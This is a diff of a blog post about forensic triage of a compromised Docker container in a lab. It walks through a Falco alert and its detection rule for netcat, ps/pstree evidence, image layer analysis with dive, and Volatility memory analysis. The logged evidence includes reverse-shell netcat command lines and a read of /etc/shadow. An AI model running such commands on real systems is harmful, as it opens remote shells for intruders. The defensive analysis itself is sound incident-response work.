@@ -7,7 +7,7 @@ date: 2022-05-05T15:14:39+10:00
 
 This post is going to focus on the triaging and analysis of a container that has been compromised. 
 
-
+---
 ### PIDs
 
 Before we get into the actual analysis lets start with a quick overview of how processes exist in containers. When you run PS inside a container you typically get a very short list of running processes, and not all of the processes that are currently running on the underlying host. This is due to one of the foundational compoents that make a container a container, namespaces. Linux namespaces *isolate* the proceses within containers. What does this look like in practice? Lets look.
@@ -36,34 +36,81 @@ This is due to the Linux namespace restricting our view so we can only see proce
 
 For a much more indepth explaination I highly reccommend the book [Container Security: Fundamental Technology Concepts that Protect Containerized Applications](https://www.oreilly.com/library/view/container-security/9781492056690/) by Liz Rice. Last I checked Aqua security was giving the ebook away for free.
 
+---
 ### The Scene
-Moving on to a more practical example let's pretend that we get an alert or a system admin reached out to us because of some strange behavior they were seeing on a host that runs container workloads. When we begin our investigation we see something that instantly looks off (it is a bit contrived but works for our purposes).
+Moving on to a more practical example let's pretend that we get an alert from our runtime protection agent running on the a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. The alert is below:
+
+```
+{
+  "output": "21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)",
+  "priority": "Warning",
+  "rule": "Netcat Remote Code Execution in Container",
+  "source": "syscall",
+  "tags": [
+    "mitre_execution",
+    "network",
+    "process"
+  ],
+  "time": "2022-05-10T21:39:47.159547041Z",
+  "output_fields": {
+    "container.id": "60795d68fdee",
+    "container.image.repository": "webapp",
+    "container.image.tag": "v1.0",
+    "container.name": "eloquent_babbage",
+    "evt.time": 1652218787159547100,
+    "proc.cmdline": "nc 172.31.93.20 9876 -e /bin/sh",
+    "user.loginuid": -1,
+    "user.name": "www-data"
+  }
+}
+```
+
+The rule name is `Netcat Remote Code Execution in Container` (ruh roh), and in the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the [rule](https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2462) syntax it is a fairly simple rule.
+
+```
+ spawned_process and container and
+    ((proc.name = "nc" and (proc.args contains "-e" or proc.args contains "-c")) or
+     (proc.name = "ncat" and (proc.args contains "--sh-exec" or proc.args contains "--exec" or proc.args contains "-e "
+                              or proc.args contains "-c " or proc.args contains "--lua-exec"))
+    )
+```
+
+The output for the rule is:
+```
+output: >
+    Netcat runs inside container that allows remote code execution (user=%user.name user_loginuid=%user.loginuid
+    command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag)
+```
+
+If we wanted to have additional information such as process id or parent process id in the output we could add that.
+
+Comparing the rule to the process cmdline included in the output_fields we can see clearly why it was triggered. Falco is a great tool and free to use. The fact that it is container aware makes it a great tool when looking to detect suspicious and malicious behavior in a container environment.
+
+On the host when we run `ps aux` we see an output similar to the one below. 
 
 ```
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-www-data    5631  0.0  0.0   4296   732 ?        S    12:07   0:00 sh -c ping  -c 4 & /bin/nc 172.31.18.167 8888 -e /bin/bash
+www-data   12520  0.0  0.0   4296   796 ?        S    21:53   0:00 sh -c ping  -c 4 & nc 172.31.93.20 9876 -e /bin/sh
 ```
 
-We know this host runs containers, and guessing by the username this is probably tied to a webserver. In speaking with the system admin we learn that this host does not directly run a webserver, but it's very likely one of the application teams is running a webserver to host an application out of one of the container workloads. We can confirm this is true by looking at the pstree output:
+Digging deeper if we run `pstree -asp 12520` we see that the nc process is a child of apache2. 
 
 ```
-pstree -asp 5631
+pstree -asp 12520
 
 systemd,1
-  └─containerd-shim,1201 -namespace moby -id 74103b827ac72be1de5a00ebc2524b8100abdfb8fee9209e35fda295049c9f95 -address /run/containerd/containerd.sock
-      └─main.sh,1223 /main.sh
-          └─apache2,1566 -k start
-              └─apache2,5239 -k start
-                  └─sh,5631 -c ping  -c 4 & /bin/nc 172.31.18.167 8888 -e /bin/bash
-                      └─bash,5633
+  └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock
+      └─main.sh,11992 /main.sh
+          └─apache2,12323 -k start
+              └─apache2,12336 -k start
+                  └─sh,12520 -c ping  -c 4 & nc 172.31.93.20 9876 -e /bin/sh
+                      └─sh,12522 -c /bin/sh
+                          └─sh,12523
 ```
 
-Unfortunatly during the middle of our initial triage the machine is destroyed by the administrator in an attempt to resolve the issue. A few days later we get additional alerts from the newly created host. The alert: 
+nc usage is common in most place where Linux is used. It is not common to see nc as a child process of apache2. We know there is an active nc session, but what else has occured in the container? Let's dive into the image a figure it out. At this point several additional alerts from Falco start to roll in, and after speaking with the application owner we learn that they put nc in the container for troubleshooting connectivity issues, but they always ran it from a shell in the container as root never as the apache user. They also confirmed they have not been doing any testing recently. If this were a real scenario this host would probably be isolated if possible and attempts would be made to understand what kind of data is processed on the machine. Thankfully this is just a lab and all of that is out of scope for this post :).
 
-```
-10:20:05.408091526: Warning Sensitive file opened for reading by non-trusted program (user=root command=cat /etc/shadow file=/etc/shadow)
-```
-
+---
 ### Carving the running container out
 
 First lets grab the eqivilant of a disk image of the running container this. We'll be able to perform an analysis on the image and it also preserves the image in the event that it is killed. *Note: this post mainly focuses on the container itself, opperating within a Kubernetes cluster is highly likely in a scenario similar to this. There are additional things that should occur when performing analysis on a Kubernetes cluster to preserve and protect both the running container and the host that the container is running on. Failure to do so may result in the entire node being terminated and all relevant evidence along with it.*
@@ -73,21 +120,21 @@ Lets determine the container id where this process lives
 ```
 # docker ps
 CONTAINER ID   IMAGE                  COMMAND      CREATED       STATUS       PORTS                               NAMES
-74103b827ac7   publicfacingapp:v1.0   "/main.sh"   2 hours ago   Up 2 hours   0.0.0.0:80->80/tcp, :::80->80/tcp   pensive_newton
+60795d68fdee   webapp:v1.0   "/main.sh"   3 hours ago   Up 3 hours   0.0.0.0:80->80/tcp, :::80->80/tcp   eloquent_babbage
 ```
 
 Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched:
 
 ```
-docker commit 74103 sec-incident:123
+docker commit 6079 sec-incident:123
 ```
 
 When we run the `docker images` command we see our new image, as well as the orignal image the container launched with. 
 
 ```
-REPOSITORY        TAG       IMAGE ID       CREATED          SIZE
-sec-incident      123       21ec0e2680fa   5 seconds ago    845MB
-publicfacingapp   v1.0      ab0d83586b6e   3 years ago      712MB
+REPOSITORY             TAG       IMAGE ID       CREATED          SIZE
+sec-incident           123       9f64c8bead0e   21 seconds ago   845MB
+webapp                 v1.0      7adda9b17363   3 hours ago      714MB
 ```
 
 Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will save the image so that it is portable and can be moved to our analysis workstation.
@@ -96,22 +143,12 @@ Comparing the sizes of the two images there have been lots of changes within the
 docker save sec-incident:123 -o sec-incident.tar
 ```
 
-It's important to note we are using the `docker save` command instead of the `docker export` command. Both with produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from it's initial launch.
+It's important to note we are using the `docker save` command specifying the image we created from the running container instead of the `docker export` command on the running container. Both with produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from it's initial launch. From here as an analyst the tar files will more than likely be exported to an analysis machine.
 
-df -h
+To let other tools and docker interact with the image we need to perform a `docker load` on the tar file produced from the `docker save` command. This will trigger the following output:
 
-Let's dig into those changes.
-
-### Dive
-
-There are several tools that can be used to perform static analysis of a container image. One of my favorites is dive. Dive is "a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image." Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.
-
-Once installed on our analysis system we can 
-
-
-docker load:
 ```
-docker load < security-incident-123.tar
+docker load < sec-incident-save.tar
 a75caa09eb1f: Loading layer [==================================================>]    105MB/105MB
 80f9a8427b18: Loading layer [==================================================>]  494.7MB/494.7MB
 97a1040801c3: Loading layer [==================================================>]  7.168kB/7.168kB
@@ -124,11 +161,135 @@ deeea3c4d56f: Loading layer [==================================================>
 Loaded image: sec-incident-123:latest
 ```
 
-Looking at the image in dive in the top left panel we can see all of the image layers. The bottom layer are all of the changes that occureced since the image was started to the time we saved the image. In our case ~122MB of changes occured.
+From this output we can tell there are 9 unique layers to this image. 
+
+---
+### What is an image
+
+An image according to docker.com is "A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings." Technically however an image is just a collection of tar'd files/folders. Each layer is a folder within the tar file. Within each layers folder contains information about the layer, and then any files associated with that particular layer.
+
+In our example when we extract the sec-incident-save.tar file we see an out put that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is `manifest.json`, `repositories`, and a `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` file. The `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` file uses the hash of the image. The image hash is a sha256sum of this config file. 
+
+```
+tar -xvf sec-incident-save.tar
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/json
+1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/VERSION
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/json
+2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/VERSION
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/json
+69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/VERSION
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/json
+6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/VERSION
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/json
+8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/VERSION
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/json
+9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar
+9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/VERSION
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/json
+a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/VERSION
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/json
+c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/VERSION
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/json
+c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/VERSION
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/json
+ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/VERSION
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/json
+caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar
+manifest.json
+repositories
+```
+
+The `manifest.json` file shows us information about the layers in the image as well as the repo/tags associated with the image
+
+```
+[
+  {
+    "Config": "9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json",
+    "RepoTags": [
+      "sec-incident:123"
+    ],
+    "Layers": [
+      "69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar",
+      "9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar",
+      "1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar",
+      "c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar",
+      "c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar",
+      "a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar",
+      "2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar",
+      "caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar",
+      "8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar",
+      "ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar",
+      "6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar"
+    ]
+  }
+]
+```
+
+The `repositories` file is just information about the image 
+
+```
+{"sec-incident":{"123":"6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2"}}
+```
+
+When we look at the `9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json` config file we can see all of the layers and what command(s) were used to create the layer. Below is a snip from the file:
+
+```
+    {
+      "created": "2018-10-12T17:49:01.240444043Z",
+      "created_by": "/bin/sh -c #(nop)  ENTRYPOINT [\"/main.sh\"]",
+      "empty_layer": true
+    },
+    {
+      "created": "2022-05-10T21:32:10.671619454Z",
+      "created_by": "/bin/sh -c #(nop) COPY file:2d20aa4eee806c995fcc211ba0077b67c72aa53ac0ba27ec57a721820907c4ff in /bin/nc "
+    },
+    {
+      "created": "2022-05-10T21:32:11.329409992Z",
+      "created_by": "/bin/sh -c chmod +x /bin/nc"
+    },
+    {
+      "created": "2022-05-11T00:38:09.016419258Z"
+    }
+```
+In the above output we can clearly see the original image launch layer which was created by the command `/bin/sh -c` with the entrypoint of `main.sh` Below that we see two additional layers added by the application owner for troubleshooting purposes where they copied `nc` into the image and then made the file executable `/bin/sh -c chmod +x /bin/nc`. The last layer only has a timestamp, but no other information. This is the layer where we will want to look because it will container any changes to the file system since the container was started. Before we start to unpack each layer and manually trompsing through lets make things easier and utilize a tool built specifically to help us visualize the data we want to see.
+
+---
+### Dive
+
+There are several tools that can be used to perform static analysis of a container image. One of my favorites is dive. Dive is "a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image." Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.
+
+Once installed on our analysis system we can 
+
+
+
+
+Looking at the image in dive in the top left panel we can see all of the image layers. The bottom layer are all of the changes that occurred since the image was started to the time we saved the image. In our case ~132MB of changes occured.
 
 ![dive-layers.png](images/dive-layers.png "dive-layers")
 
-In the section below we can see the layer details. This includes the ID and Digest. We'll use the Id (`8b05f1f5449209b8f98544dfb75b74682655a7ea5cb42076ea3bd5251fa198cb`) later when we go to extract specific files from the image.
+In the section below we can see the layer details. This includes the ID and Digest. We'll use the Id (`6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2`) later when we go to extract specific files from the image.
 
 ![dive-layer-details.png](images/dive-layer-details.png "dive-layer-details")
 
@@ -136,35 +297,38 @@ On the right we can see all of the contents of the filesystem at the current lay
 
 ![dive-layer-contents.png](images/dive-layer-contents.png "dive-layer-contents")
 
-Looking at layer contents we can see there are several new files. Unfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we'll have to extract the layer from the image. 
+We can see that a new session file was created, and that the access and error log files were modified, likely due to webtraffic to the application. As we continue to look through the change that occured we see several new files that have been created. Each file is worth digging into deeper to gain some understanding as to what has occurred.
 
+![dive-layer-contents-2.png](images/dive-layer-contents-2.png "dive-layer-contents-2")
+
+Unfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we will have to extract the layer from the image. 
+
+---
 ### File Analysis
-We can extract the layers the same way we would any other tar file
+Back in our extracted image folder we can use the layer id identified using Dive to selectivly target the layer we want.
 
-```
-tar -xvf security-incident-123.tar
-```
-
-This will create several new folders, one for each layer of the image. We want to carve files out that occured within the most recent layer created for the image. Using the what we know from Dive we know the layer id is `8b05f1f5449209b8f98544dfb75b74682655a7ea5cb42076ea3bd5251fa198cb`. 
-
+We want to carve files out that occured within the most recent layer created for the image. Using the what we know from Dive we know the layer id is `6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2`. 
 
 ![extracted-layer-details.png](images/extracted-layer-details.png "extracted-layer-details")
 
-We can about the layer.tar file once again we'll extract it with `tar -xvf layer.tar`. This presents us with all of the folders where a change occured. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was. This is only part of the picture though. 
+We care about the layer.tar file once again we will extract it with `tar -xvf layer.tar`. This presents us with all of the folders where a change occured. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was. This is only part of the picture though. 
 
+---
 ### Intermission
 
-The "disk" analysis of the container is only part of the picture though. After analyzing the files we determined that there were several webshells present. Given the timestamps of when they appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The shell was the same and it was a version of Web Shell Orb. A fairly full featured webshell with various capabilities.
+The "disk" analysis of the container is only part of the picture though. During analysis we learn the curl binary was uploaded in parts and then rebuilt as `ifj`. A coinminer was also uploaded in parts and rebuilt as the binary `8`. Additionally several webshells were uploaded. Given the timestamps of when all of the files appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The shell was the same and it was a version of Web Shell Orb. A fairly full featured webshell with various capabilities.
 
+---
 ### Memory Analysis
 
-Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option.
+Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option. Since this is a lab environment and the scenario is a bit contrived disk analysis tells enough of the story for us to understand what has occurred. If this were a bit more realistic the 8 binary probably would have been deleted from disk and we would either recover it from the /proc folder or we would carve it out of memory to perform analysis on it and determine what the binaries purpose. With that in mind I chose to skip digging into that and instead dig into some special things about container memory analysis with volatility.
+
 
 #### Volatility2
 ```
 python2 /home/ubuntu/git/volatility/vol.py --profile=Linuxubuntu-5_13_0-1022-awsx64 -f /home/ubuntu/webserver.lime linux_pslist
 ```
-When it comes to memory analysis with volatility there really isn't anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remeber is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.
+When it comes to memory analysis with volatility there really isn't anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remember is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.
 
 
 #### Volatility3
